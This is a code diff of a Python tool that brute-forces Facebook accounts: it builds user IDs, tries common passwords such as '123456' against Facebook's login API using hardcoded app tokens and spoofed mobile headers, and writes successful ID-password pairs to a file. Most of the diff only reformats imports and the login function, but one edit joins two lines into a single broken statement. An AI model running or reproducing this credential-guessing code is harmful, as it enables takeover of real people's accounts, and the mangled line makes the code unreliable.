@@ -1,13 +1,26 @@
 import os
-import datetime
+import sys
+import time
+import json
+import re
+import random
+import string
+import uuid
+import base64
+import hashlib
+import zlib
+import subprocess
+import platform
+import struct
+import ssl
+import certifi
+import _socket
+import bs4
 from bs4 import BeautifulSoup
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
-from concurrent.futures import ThreadPoolExecutor as ThreadPool 
-import uuid,base64,hashlib,zlib,subprocess,time,platform,_socket,ssl,certifi
-import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
-from concurrent.futures import ThreadPoolExecutor as tred
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
 os.system('pkg install espeak')
 
 loop,count,oks,cps,twf,usragent,ugen,okhbros,uas=0,0,[],[],[],[],[],[],[]
@@ -774,8 +787,7 @@ def MIX_CLONING():
         print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
         linex()
         for mal in user:
-            uid=year_code+mal
-            jihad.submit(login3,uid)
+            uid=year_code+mal            jihad.submit(login3,uid)
     line();print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!');linex();print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m');main()
 
 def RANDOM_CLONING():
@@ -797,68 +809,81 @@ def RANDOM_CLONING():
             uid=year_code+mal
             jihad.submit(login4,uid)            
     line();print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!');linex();print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m');main()
-
 def login1(uid):
-    global oks,loop,cps
-    Session=requests.session()
+    global oks, loop, cps
+    Session = requests.session()
     try:
-        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;46m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
+        sys.stdout.write(
+            f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]'
+            f'\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]'
+            f'\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;46m/\x1b[38;5;208mCP\33[38;5;37m]'
+            f'\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]'
+        )
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
-            data = {'adid':str(uuid.uuid4()),
-            'format': 'json',
-            'device_id':str(uuid.uuid4()),
-            'cpl': 'true',
-            'family_device_id':str(uuid.uuid4()),
-            'credentials_type': 'device_based_login_password', 
-            'error_detail_type': 'button_with_disabled', 
-            'source': 'device_based_login', 
-            'email':str(uid),
-            'password':str(pw),
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
-            'generate_session_cookies': '1', 
-            'meta_inf_fbmeta': '', 
-            'advertiser_id':str(uuid.uuid4()),
-            'currently_logged_in_userid': '0', 
-            'locale': 'en_US',
-            'client_country_code': 'US', 
-            'method': 'auth.login', 
-            'fb_api_req_friendly_name': 'authenticate', 
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
-            'api_key': '882a8490361da98702bf97a021ddc14d'}
-            head = {'User-Agent': ua,
-            'Content-Type': 'application/x-www-form-urlencoded', 
-            'Host': 'graph.facebook.com', 
-            'X-FB-Net-HNI': '25227',
-            'X-FB-SIM-HNI': '29752',
-            'X-FB-Connection-Type': 'MOBILE.LTE', 
-            'X-Tigon-Is-Retry': 'False', 
-            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
-            'x-fb-device-group': '5120', 
-            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
-            'X-FB-Request-Analytics-Tags': 'graphservice', 
-            'X-FB-HTTP-Engine': 'Liger', 
-            'X-FB-Client-IP': 'True', 
-            'X-FB-Server-Cluster': 'True', 
-            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
-            'Content-Length': '706'}
+        for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            head = {
+                'User-Agent': ua,
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+                'Content-Length': '706'
+            }
             url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            rp = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True).json()
+
             if "session_key" in rp:
-		    print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')  
-		    open("/sdcard/BRUTE_CLONING-OK.txt","a").write(uid+"|"+pw+"\n")  
-		    oks.append(uid)
-		    break
-	    elif "www.facebook.com" in rp['error']['message']:  
-		    print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')  
-		    open("/sdcard/BRUTE_CLONING-OK.txt","a").write(uid+"|"+pw+"\n")  
-		    cps.append(uid)
-		    break
-	    else:continue
-	loop+=1
-    except Exception as e:time.sleep(30)
+                print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
+                open("/sdcard/BRUTE_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                oks.append(uid)
+                break
+
+            elif "www.facebook.com" in rp['error']['message']:
+                print(f'\r\r\r\r\r\033[1;97m[\x1b[38;5;46mSUCCESFUL\033[1;97m] \x1b[38;5;46m{uid} \033[1;97m=\x1b[38;5;46m{pw}\033[1;97m')
+                open("/sdcard/BRUTE_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop += 1
+    except Exception as e:
+        time.sleep(30)
+
 def login2(uid):
     global oks,loop,cps
     Session=requests.session()
